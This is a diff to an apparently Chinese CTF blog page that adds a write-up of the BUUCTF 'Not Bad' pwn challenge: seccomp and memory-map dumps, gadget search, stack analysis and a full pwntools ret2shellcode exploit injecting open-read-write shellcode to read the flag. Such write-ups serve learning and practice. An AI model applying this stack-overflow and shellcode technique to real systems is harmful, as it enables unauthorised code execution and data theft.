@@ -379,21 +379,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-11-15
+                    2023-11-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    6.6k
+                    7.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    35 分
+                    40 分
                 </div>
                 
 
@@ -1689,6 +1689,128 @@ pwndbg<span class="token operator">></span> x/20gx 0x000000000040098a
 
   0x400d16    leave  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="极客大挑战-2019-Not-Bad"><a href="#极客大挑战-2019-Not-Bad" class="headerlink" title="[[极客大挑战 2019]Not Bad"></a>[[极客大挑战 2019]Not Bad</h2><p>没有开任何保护，开了沙箱，可以使用<code>orw</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">not_bad  seccomp-tools dump ./pwn
+ line  CODE  JT   JF      K
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+ 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch
+ 0001: 0x15 0x00 0x08 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0010
+ 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> 0x40000000<span class="token punctuation">)</span> goto 0005
+ 0004: 0x15 0x00 0x05 0xffffffff  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0xffffffff<span class="token punctuation">)</span> goto 0010
+ 0005: 0x15 0x03 0x00 0x00000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token builtin class-name">read</span><span class="token punctuation">)</span> goto 0009
+ 0006: 0x15 0x02 0x00 0x00000001  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">write</span><span class="token punctuation">)</span> goto 0009
+ 0007: 0x15 0x01 0x00 0x00000002  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">open</span><span class="token punctuation">)</span> goto 0009
+ 0008: 0x15 0x00 0x01 0x0000003c  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> <span class="token builtin class-name">exit</span><span class="token punctuation">)</span> goto 0010
+ 0009: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW
+ 0010: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>栈可读可写可执行，<code>0x123000</code>可写可执行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> vmmap
+LEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA
+             Start                End Perm     Size Offset File
+          0x123000           0x124000 <span class="token parameter variable">-wxp</span>     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_00123<span class="token punctuation">]</span>
+          0x3ff000           0x400000 rw-p     <span class="token number">1000</span>      <span class="token number">0</span> /home/starrysky/buuctf/not_bad/pwn
+          0x400000           0x401000 r-xp     <span class="token number">1000</span>   <span class="token number">1000</span> /home/starrysky/buuctf/not_bad/pwn
+          0x600000           0x601000 r--p     <span class="token number">1000</span>   <span class="token number">1000</span> /home/starrysky/buuctf/not_bad/pwn
+          0x601000           0x602000 rw-p     <span class="token number">1000</span>   <span class="token number">2000</span> /home/starrysky/buuctf/not_bad/pwn
+          0x602000           0x623000 rw-p    <span class="token number">21000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
+    0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000      <span class="token number">0</span> /home/starrysky/buuctf/not_bad/2.27/libc-2.27.so
+    0x7ffff7bcb000     0x7ffff7dcb000 ---p   <span class="token number">200000</span> 1e7000 /home/starrysky/buuctf/not_bad/2.27/libc-2.27.so
+    0x7ffff7dcb000     0x7ffff7dcf000 r--p     <span class="token number">4000</span> 1e7000 /home/starrysky/buuctf/not_bad/2.27/libc-2.27.so
+    0x7ffff7dcf000     0x7ffff7dd1000 rw-p     <span class="token number">2000</span> 1eb000 /home/starrysky/buuctf/not_bad/2.27/libc-2.27.so
+    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     <span class="token number">4000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_7ffff7dd1<span class="token punctuation">]</span>
+    0x7ffff7dd5000     0x7ffff7dfc000 r-xp    <span class="token number">27000</span>      <span class="token number">0</span> /home/starrysky/buuctf/not_bad/2.27/ld-2.27.so
+    0x7ffff7fbb000     0x7ffff7fbe000 rw-p     <span class="token number">3000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_7ffff7fbb<span class="token punctuation">]</span>
+    0x7ffff7fbe000     0x7ffff7fc0000 r--p     <span class="token number">2000</span>      <span class="token number">0</span> /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+    0x7ffff7fc0000     0x7ffff7fcf000 r-xp     f000   <span class="token number">2000</span> /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+    0x7ffff7fcf000     0x7ffff7fdd000 r--p     e000  <span class="token number">11000</span> /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+    0x7ffff7fdd000     0x7ffff7fde000 ---p     <span class="token number">1000</span>  1f000 /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+    0x7ffff7fde000     0x7ffff7fdf000 r--p     <span class="token number">1000</span>  1f000 /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+    0x7ffff7fdf000     0x7ffff7fe0000 rw-p     <span class="token number">1000</span>  <span class="token number">20000</span> /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+    0x7ffff7fe0000     0x7ffff7fe2000 rw-p     <span class="token number">2000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_7ffff7fe0<span class="token punctuation">]</span>
+    0x7ffff7ff6000     0x7ffff7ffa000 r--p     <span class="token number">4000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>
+    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     <span class="token number">2000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>
+    0x7ffff7ffc000     0x7ffff7ffd000 r--p     <span class="token number">1000</span>  <span class="token number">27000</span> /home/starrysky/buuctf/not_bad/2.27/ld-2.27.so
+    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     <span class="token number">1000</span>  <span class="token number">28000</span> /home/starrysky/buuctf/not_bad/2.27/ld-2.27.so
+    0x7ffff7ffe000     0x7ffff7fff000 rw-p     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_7ffff7ffe<span class="token punctuation">]</span>
+    0x7ffffffde000     0x7ffffffff000 rwxp    <span class="token number">21000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>
+0xffffffffff600000 0xffffffffff601000 <span class="token parameter variable">--xp</span>     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以本题的思路就是<code>ret2shellcode</code>，运行到<code>shellcode</code>的方法就是<code>jmp rsp</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">not_bad  ROPgadget <span class="token parameter variable">--binary</span> pwn <span class="token parameter variable">--only</span> <span class="token string">'jmp'</span>
+Gadgets information
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+0x000000000040078b <span class="token builtin class-name">:</span> jmp 0x400770
+0x00000000004008eb <span class="token builtin class-name">:</span> jmp 0x400880
+0x0000000000400b03 <span class="token builtin class-name">:</span> jmp 0x400b7a
+0x0000000000400b87 <span class="token builtin class-name">:</span> jmp qword ptr <span class="token punctuation">[</span>rax - 0x68000000<span class="token punctuation">]</span>
+0x0000000000400ceb <span class="token builtin class-name">:</span> jmp qword ptr <span class="token punctuation">[</span>rbp<span class="token punctuation">]</span>
+0x0000000000400865 <span class="token builtin class-name">:</span> jmp rax
+0x0000000000400a01 <span class="token builtin class-name">:</span> jmp rsp
+
+Unique gadgets found: <span class="token number">7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先随意填充局部变量和<code>rbp</code>，再运行到<code>jmp rsp</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; stack	
+00:0000│ rsp 0x7fff2bc941f0 ◂— 0xc748ff3148c03148	&lt;--局部变量开始位置
+01:0008│     0x7fff2bc941f8 ◂— 0xc2c74800123000c6
+02:0010│     0x7fff2bc94200 ◂— 0xc748050f00000100
+03:0018│     0x7fff2bc94208 ◂— 0xd0ff00123000c0
+04:0020│ rbp 0x7fff2bc94210 ◂— 0x0
+05:0028│     0x7fff2bc94218 —▸ 0x400a01 ◂— jmp rsp
+06:0030│     0x7fff2bc94220 ◂— 0x480ae4ff30ec8348	&lt;--跳转之后能执行的位置
+07:0038│     0x7fff2bc94228 —▸ 0x123000 ◂— add byte ptr [rax], al<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">► 0x400a01          jmp    rsp                           <span class="token operator">&lt;</span>0x7fff2bc9422<span class="token operator"><span class="token file-descriptor important">0</span>></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>写入长度不够，在能执行的位置可以写入<code>shellcode</code>先扩充能执行代码空间，即<code>sub rsp, 0x20</code> <code>jmp rsp</code>,执行到局部变量内容，然后在局部变量中填入<code>shellcode</code>来再次读取，由于没开<code>pie</code>所以可以选择读取到<code>0x123000</code>，读取之后还需要去执行<code>shellcode</code>，所以需要先将读取的地址赋给<code>rax</code>,接着<code>call rax</code>即可执行<code>shellcode</code>,即<code>orw</code></p>
+<p>最终exp如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>
+
+li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+
+<span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>
+
+debug <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
+    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27338</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+
+jmp_rsp <span class="token operator">=</span> <span class="token number">0x0000000000400a01</span>
+
+p <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
+xor rax,rax;
+xor rdi,rdi;
+mov rsi,0x123000;
+mov rdx,0x100;
+syscall;
+mov rax,0x123000;
+call rax;
+"""</span></span>
+p <span class="token operator">=</span> asm<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span><span class="token string">'sub rsp,0x30;jmp rsp'</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+
+shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -2031,7 +2153,7 @@ pwndbg<span class="token operator">></span> x/20gx 0x000000000040098a
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">54k</span>&nbsp;字
+                class="white-color">54.9k</span>&nbsp;字
             
             
             
